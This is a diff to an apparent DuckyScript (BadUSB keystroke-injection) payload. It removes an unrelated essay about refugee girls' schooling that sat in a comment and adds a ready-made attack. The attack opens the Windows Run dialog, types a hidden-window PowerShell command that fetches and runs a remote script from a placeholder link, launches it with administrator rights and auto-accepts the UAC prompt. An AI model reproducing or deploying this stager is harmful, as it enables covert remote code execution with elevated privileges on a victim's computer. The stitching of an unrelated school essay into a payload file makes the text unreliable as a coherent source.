@@ -1,10 +1,10 @@
 DELAY 1000
+GUI r
 DELAY 300
-REM Refugee girls face several struggles when trying to attend school, according to the excerpt. Many girls have responsibilities at home, which can keep them from going to school regularly. Some also lack support or opportunities, making it harder for them to stay motivated and continue their education. Because of these challenges, girls may fall behind or even stop attending school.
-
-The program Together for Girls helps encourage change, especially through sports. The excerpt explains that sports give girls a reason to attend school and stay involved. By participating in sports, girls build confidence and feel more included in their community. This helps them become more motivated to keep learning. The program also encourages communities to see the value of educating girls and supporting their growth both in school and in activities like sports.
-
-In conclusion, refugee girls struggle with responsibilities and limited opportunities, but Together for Girls helps by using sports and support systems to keep girls engaged in school and create positive change
+REM Put Your PowerShell Scripts Link Here
+STRING powershell -w h iex (irm "link")
 DELAY 200
+CTRL-SHIFT-ENTER
 DELAY 3000
+ALT y
 DELAY 100
